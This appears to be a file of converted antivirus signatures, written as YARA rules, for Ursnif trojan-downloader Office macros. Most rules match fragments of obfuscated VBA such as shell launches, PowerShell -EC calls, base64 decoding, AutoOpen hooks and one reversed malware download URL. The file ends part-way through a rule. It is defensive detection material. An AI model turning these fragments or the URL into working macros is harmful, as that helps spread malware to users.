rule TrojanDownloader_O97M_Ursnif_2147731740_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif!MTB"
        threat_id = "2147731740"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 22 63 6d 64 2e 65 78 65 20 2f 63 20 50 5e 22 20 2b 20 43 68 72 28 03 00 20 2b 20 03 00 20 2b 20 28 03 00 29 20 2b 20 03 00 29 20 2b 20 22 5e 57 5e 65 5e 72 5e 73 5e 22 20 2b 20 43 68 72 28 03 00 20 2b 20 28 03 00 20 2a 20 03 00 29 29 20 2b 20 22 5e 65 5e 4c 5e 4c 5e 2e 5e 65 5e 78 5e 65 5e 20 5e 2d 5e 45 5e 43 5e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_AA_2147743842_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.AA!MTB"
        threat_id = "2147743842"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 54 65 78 74 46 69 6c 65 28 [0-21] 28 29 20 26 20 22 5c [0-21] 2e 78 73 22 20 26}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 54 65 78 74 46 69 6c 65 28 [0-21] 28 29 20 26 20 22 5c [0-21] 2e 78 22 20 2b 20 [0-21] 28 29 2c 20 31 29}  //weight: 1, accuracy: Low
        $x_1_3 = "\"appdata\"" ascii //weight: 1
        $x_1_4 = {3d 20 43 68 72 28 22 26 68 22 20 26 20 4d 69 64 28 [0-21] 2c}  //weight: 1, accuracy: Low
        $x_1_5 = "= \"\"" ascii //weight: 1
        $x_1_6 = "= New WshShell" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_AA_2147743842_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.AA!MTB"
        threat_id = "2147743842"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 68 65 6c 6c 20 4c 65 66 74 28 52 65 70 6c 61 63 65 28 [0-15] 28 [0-9] 29 2c 20 (41|2d|5a) 2c 20 22 20 22 29 2c 20 4c 65 6e 28 52 65 70 6c 61 63 65 28 00 28 01 29 2c 20 02 2c 20 22 20 22 29 29 20 2d 20 (61|2d|7a) 29 2c 20 [0-6] 42 75 74 74 6f 6e 53 65 74 41 62 6f 72 74 52 65 74 72 79 49 67 6e 6f 72 65}  //weight: 1, accuracy: Low
        $x_1_2 = {44 69 6d 20 [0-90] 28 29 20 41 73 20 53 74 72 69 6e 67 0d 0a 00 28 29 20 3d 20 53 70 6c 69 74 28 (61|2d|7a) 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_AB_2147743906_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.AB!MTB"
        threat_id = "2147743906"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {26 20 22 5c [0-32] 2e 78 73 6c 22}  //weight: 1, accuracy: Low
        $x_1_2 = "\"appdata\"" ascii //weight: 1
        $x_1_3 = {3d 20 43 68 72 28 22 26 68 22 20 26 20 4d 69 64 28 [0-21] 2c 20 [0-21] 2c 20 32 29 29}  //weight: 1, accuracy: Low
        $x_1_4 = "= \"\"" ascii //weight: 1
        $x_1_5 = "= New WshShell" ascii //weight: 1
        $x_1_6 = "= Environ(" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_AC_2147743917_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.AC!MTB"
        threat_id = "2147743917"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 54 65 78 74 46 69 6c 65 28 [0-20] 2e 43 6f 6e 74 72 6f 6c 73 28 31 29 2e 56 61 6c 75 65 2c 20 54 72 75 65 29}  //weight: 1, accuracy: Low
        $x_1_2 = ".Controls(0)" ascii //weight: 1
        $x_1_3 = ".Controls(0 + 1)" ascii //weight: 1
        $x_1_4 = ".Open" ascii //weight: 1
        $x_1_5 = ".Close" ascii //weight: 1
        $x_1_6 = ".Value" ascii //weight: 1
        $x_1_7 = "= Chr(115) + \"h\" + \"ell\"" ascii //weight: 1
        $x_1_8 = "Sub AutoOpen()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_AD_2147744051_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.AD!MTB"
        threat_id = "2147744051"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {26 20 22 5c [0-16] 22 20 26 20 53 74 72 52 65 76 65 72 73 65 28 22 6c 73 78 2e 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 43 68 72 28 22 26 68 22 20 26 20 4d 69 64 28 [0-16] 2c 20 [0-16] 2c 20 32 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = "= \"appdata\"" ascii //weight: 1
        $x_1_4 = "= \"\"" ascii //weight: 1
        $x_1_5 = "= New WshShell" ascii //weight: 1
        $x_1_6 = {3d 20 45 6e 76 69 72 6f 6e 28 [0-16] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_AE_2147744052_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.AE!MTB"
        threat_id = "2147744052"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= Chr(115) + \"h\" + \"ell\"" ascii //weight: 1
        $x_1_2 = {2e 43 72 65 61 74 65 54 65 78 74 46 69 6c 65 28 [0-18] 29}  //weight: 1, accuracy: Low
        $x_1_3 = ".Controls(1).Value" ascii //weight: 1
        $x_1_4 = "= Fix(" ascii //weight: 1
        $x_1_5 = ".Controls(0 + 1)" ascii //weight: 1
        $x_1_6 = ".Open" ascii //weight: 1
        $x_1_7 = {2e 57 72 69 74 65 4c 69 6e 65 20 [0-18] 2e 56 61 6c 75 65}  //weight: 1, accuracy: Low
        $x_1_8 = "Sub AutoOpen()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_AF_2147744144_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.AF!MTB"
        threat_id = "2147744144"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "10"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= Chr(115) + \"h\" + \"ell\"" ascii //weight: 1
        $x_1_2 = "= CreateObject(\"Scripting.FileSystemObject\")" ascii //weight: 1
        $x_1_3 = ".Controls(1).Text" ascii //weight: 1
        $x_1_4 = ".Controls(vbHide)" ascii //weight: 1
        $x_1_5 = ".Open" ascii //weight: 1
        $x_1_6 = ".Value" ascii //weight: 1
        $x_1_7 = {2e 57 72 69 74 65 4c 69 6e 65 20 [0-22] 2e 54 65 78 74}  //weight: 1, accuracy: Low
        $x_1_8 = "ActiveDocument.Range.PageSetup.LeftMargin = " ascii //weight: 1
        $x_1_9 = "+ \".applica\" + \"tion\"" ascii //weight: 1
        $x_1_10 = "Sub AutoOpen()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_AG_2147744146_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.AG!MTB"
        threat_id = "2147744146"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {26 20 22 5c [0-16] 22 20 26 20 [0-16] 28 22 [0-16] 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 43 68 72 28 22 26 68 22 20 26 20 4d 69 64 28 [0-16] 2c 20 [0-16] 2c 20 32 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = "= \"appdata\"" ascii //weight: 1
        $x_1_4 = "= \"\"" ascii //weight: 1
        $x_1_5 = "= Fix(" ascii //weight: 1
        $x_1_6 = {2e 43 72 65 61 74 65 54 65 78 74 46 69 6c 65 28 [0-16] 28 29 2c 20 31 29}  //weight: 1, accuracy: Low
        $x_1_7 = "= New WshShell" ascii //weight: 1
        $x_1_8 = {3d 20 45 6e 76 69 72 6f 6e 28 [0-16] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_AH_2147744201_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.AH!MTB"
        threat_id = "2147744201"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {26 20 22 5c [0-16] 2e 22 20 26}  //weight: 1, accuracy: Low
        $x_1_2 = "= \"temp\"" ascii //weight: 1
        $x_1_3 = "= \"exe\"" ascii //weight: 1
        $x_1_4 = "Put #nFileNum, , CByte(\"&H\" & arrBytes(i))" ascii //weight: 1
        $x_1_5 = {2e 73 31 2e 56 61 6c 75 65 20 26 20 [0-16] 2e 73 32 2e 54 65 78 74}  //weight: 1, accuracy: Low
        $x_1_6 = "= New WshShell" ascii //weight: 1
        $x_1_7 = {3d 20 45 6e 76 69 72 6f 6e 28 [0-16] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_AI_2147744255_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.AI!MTB"
        threat_id = "2147744255"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {26 20 22 5c [0-16] 2e 22 20 26 20 [0-8] 20 26 20 22 6c 22}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 43 68 72 28 22 26 68 22 20 26 20 4d 69 64 28 [0-8] 2c 20 [0-16] 2c 20 [0-16] 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = "= \"tmp\"" ascii //weight: 1
        $x_1_4 = {2e 43 72 65 61 74 65 54 65 78 74 46 69 6c 65 28 [0-8] 28 29 2c 20 31 29}  //weight: 1, accuracy: Low
        $x_1_5 = {2e 72 75 6e 20 [0-6] 2c}  //weight: 1, accuracy: Low
        $x_1_6 = "= \"\"" ascii //weight: 1
        $x_1_7 = "= New WshShell" ascii //weight: 1
        $x_1_8 = {3d 20 45 6e 76 69 72 6f 6e 28 [0-16] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_AJ_2147744270_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.AJ!MTB"
        threat_id = "2147744270"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 54 65 78 74 46 69 6c 65 28 [0-16] 20 26 20 [0-48] 2e 78 73 6c 22 2c 20 31 29}  //weight: 1, accuracy: Low
        $x_1_2 = {26 20 43 68 72 28 [0-8] 28 [0-8] 28 [0-8] 29 2c}  //weight: 1, accuracy: Low
        $x_1_3 = "VBA.Interaction.Shell" ascii //weight: 1
        $x_1_4 = "= \"bin.base64\"" ascii //weight: 1
        $x_1_5 = ".value" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_AJ_2147744270_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.AJ!MTB"
        threat_id = "2147744270"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= Chr(100 + 10 + 5) + \"h\" + \"ell\"" ascii //weight: 1
        $x_1_2 = ".Controls(1).Text" ascii //weight: 1
        $x_1_3 = ".Controls(0 + 1)" ascii //weight: 1
        $x_1_4 = ".Value" ascii //weight: 1
        $x_1_5 = ".Open" ascii //weight: 1
        $x_1_6 = {2e 57 72 69 74 65 4c 69 6e 65 20 [0-24] 2e 54 65 78 74}  //weight: 1, accuracy: Low
        $x_1_7 = {2e 43 72 65 61 74 65 54 65 78 74 46 69 6c 65 28 [0-24] 29}  //weight: 1, accuracy: Low
        $x_1_8 = "Sub AutoOpen()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_AK_2147744298_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.AK!MTB"
        threat_id = "2147744298"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {26 20 22 5c [0-16] 2e 78 73 6c 22}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 43 68 72 28 22 26 68 22 20 26 20 4d 69 64 28 [0-8] 2c 20 [0-6] 2c 20 [0-6] 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = "= \"tmp\"" ascii //weight: 1
        $x_1_4 = {2e 43 72 65 61 74 65 54 65 78 74 46 69 6c 65 28 [0-8] 28 29 2c 20 31 29}  //weight: 1, accuracy: Low
        $x_1_5 = {2e 72 75 6e 20 [0-6] 2c}  //weight: 1, accuracy: Low
        $x_1_6 = "= \"\"" ascii //weight: 1
        $x_1_7 = "= New WshShell" ascii //weight: 1
        $x_1_8 = {3d 20 45 6e 76 69 72 6f 6e 28 [0-16] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_AL_2147744321_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.AL!MTB"
        threat_id = "2147744321"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= Chr(100 + 10 + 5) + \"h\" + \"ell\"" ascii //weight: 1
        $x_1_2 = ".Controls(1).Text" ascii //weight: 1
        $x_1_3 = ".Controls(2 - 1 - 1)" ascii //weight: 1
        $x_1_4 = ".Open" ascii //weight: 1
        $x_1_5 = {50 72 69 6e 74 20 23 ?? 2c 20 [0-80] 2e 54 65 78 74}  //weight: 1, accuracy: Low
        $x_1_6 = "Close #" ascii //weight: 1
        $x_1_7 = "Sub AutoOpen()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_AM_2147744351_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.AM!MTB"
        threat_id = "2147744351"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= Chr(13 + 2 + 50 + 49 + 1) + \"hell\"" ascii //weight: 1
        $x_1_2 = ".Controls(Len(\"a\")).Value" ascii //weight: 1
        $x_1_3 = {4f 70 65 6e 20 54 72 69 6d 28 [0-80] 29 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23}  //weight: 1, accuracy: Low
        $x_1_4 = {50 72 69 6e 74 20 23 ?? 2c 20 [0-80] 2e 54 65 78 74}  //weight: 1, accuracy: Low
        $x_1_5 = "Close #" ascii //weight: 1
        $x_1_6 = "Sub AutoOpen()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_AM_2147744351_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.AM!MTB"
        threat_id = "2147744351"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {26 20 22 5c [0-16] 2e 78 22}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 43 68 72 28 22 26 68 22 20 26 20 4d 69 64 28 [0-8] 2c 20 [0-6] 2c 20 [0-6] 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = "= \"tmp\"" ascii //weight: 1
        $x_1_4 = {2e 43 72 65 61 74 65 54 65 78 74 46 69 6c 65 28 [0-8] 28 29 20 [0-16] 2c 20 31 29}  //weight: 1, accuracy: Low
        $x_1_5 = "= \"\"" ascii //weight: 1
        $x_1_6 = "(\"winmgmts:root\\cimv2:Win32_Process\")" ascii //weight: 1
        $x_1_7 = {3d 20 45 6e 76 69 72 6f 6e 28 [0-16] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_AN_2147744625_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.AN!MTB"
        threat_id = "2147744625"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {26 20 22 5c [0-16] 2e 78 22}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 43 68 72 28 22 26 68 22 20 26 20 4d 69 64 28 [0-8] 2c 20 [0-6] 2c 20 [0-6] 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 22 74 [0-1] 6d 70 22}  //weight: 1, accuracy: Low
        $x_1_4 = "= \"\"" ascii //weight: 1
        $x_1_5 = "\"bin.base64\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_AO_2147744876_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.AO!MTB"
        threat_id = "2147744876"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {26 20 22 5c [0-21] 2e 78 73 6c 22 2c 20 31 29}  //weight: 1, accuracy: Low
        $x_1_2 = "\"bin.base64\"" ascii //weight: 1
        $x_1_3 = "#If VBA7 Then" ascii //weight: 1
        $x_1_4 = "Private Declare PtrSafe Function ShellExecute Lib \"shell32.dll\"" ascii //weight: 1
        $x_1_5 = ".Text" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_AP_2147744934_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.AP!MTB"
        threat_id = "2147744934"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= Chr(13 + 2 + 50 + 49 + 1) + \"hell\"" ascii //weight: 1
        $x_1_2 = {2e 43 6f 6e 74 72 6f 6c 73 28 4c 65 6e 28 22 [0-2] 22 29 29 2e 56 61 6c 75 65}  //weight: 1, accuracy: Low
        $x_1_3 = {4f 70 65 6e 20 54 72 69 6d 28 [0-80] 29 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23}  //weight: 1, accuracy: Low
        $x_1_4 = {50 72 69 6e 74 20 23 ?? 2c 20 54 72 69 6d 28}  //weight: 1, accuracy: Low
        $x_1_5 = ".Text" ascii //weight: 1
        $x_1_6 = "Sub AutoOpen()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_AQ_2147745275_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.AQ!MTB"
        threat_id = "2147745275"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= Chr(230 - (30 / 2) - (50 * 2)) + \"HELL.\"" ascii //weight: 1
        $x_1_2 = {2e 43 6f 6e 74 72 6f 6c 73 28 [0-72] 29 2e 56 61 6c 75 65}  //weight: 1, accuracy: Low
        $x_1_3 = {4f 70 65 6e 20 54 72 69 6d 28 [0-80] 29 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23}  //weight: 1, accuracy: Low
        $x_1_4 = {50 72 69 6e 74 20 23 ?? 2c 20 54 72 69 6d 28}  //weight: 1, accuracy: Low
        $x_1_5 = "Value" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_AR_2147745550_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.AR!MTB"
        threat_id = "2147745550"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "12"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "URLDownloadToFileA\" (" ascii //weight: 1
        $x_10_2 = "bac.9kon=l?php.p23i0oia/58ol02ew/moc.8fjjfbb//:ptth\"," ascii //weight: 10
        $x_1_3 = {28 22 74 6d 70 22 29 20 26 20 22 5c [0-9] 2e 74 6d 70 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_AR_2147745550_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.AR!MTB"
        threat_id = "2147745550"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= Chr(115 + 0) + \"HELL.\"" ascii //weight: 1
        $x_1_2 = {2e 43 6f 6e 74 72 6f 6c 73 28 [0-85] 29 2e 54 65 78 74}  //weight: 1, accuracy: Low
        $x_1_3 = {4f 70 65 6e 20 54 72 69 6d 28 [0-85] 29 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23}  //weight: 1, accuracy: Low
        $x_1_4 = {50 72 69 6e 74 20 23 ?? 2c 20 54 72 69 6d 28}  //weight: 1, accuracy: Low
        $x_1_5 = ".Value" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_AR_2147745550_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.AR!MTB"
        threat_id = "2147745550"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 45 6e 76 69 72 6f 6e 28 [0-15] 29 0d 0a 49 66 20 53 65 63 6f 6e 64 28 22 [0-2] 3a [0-2] 3a [0-2] 22 29 20 3d 20 22 (30|2d|39) (30|2d|39) 22 20 54 68 65 6e 0d 0a [0-10] 20 3d 20 52 65 70 6c 61 63 65 28 05 2c 20 22 5c 22 2c 20 22 5c 5c 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = {52 65 70 6c 61 63 65 28 [0-15] 2c 20 22 5c 22 2c 20 22 5c 5c 22 29 28 00 00 20 3d 20}  //weight: 1, accuracy: Low
        $x_1_3 = "MsgBox (\"Error:\" & vbCrLf & \"Content not available\")" ascii //weight: 1
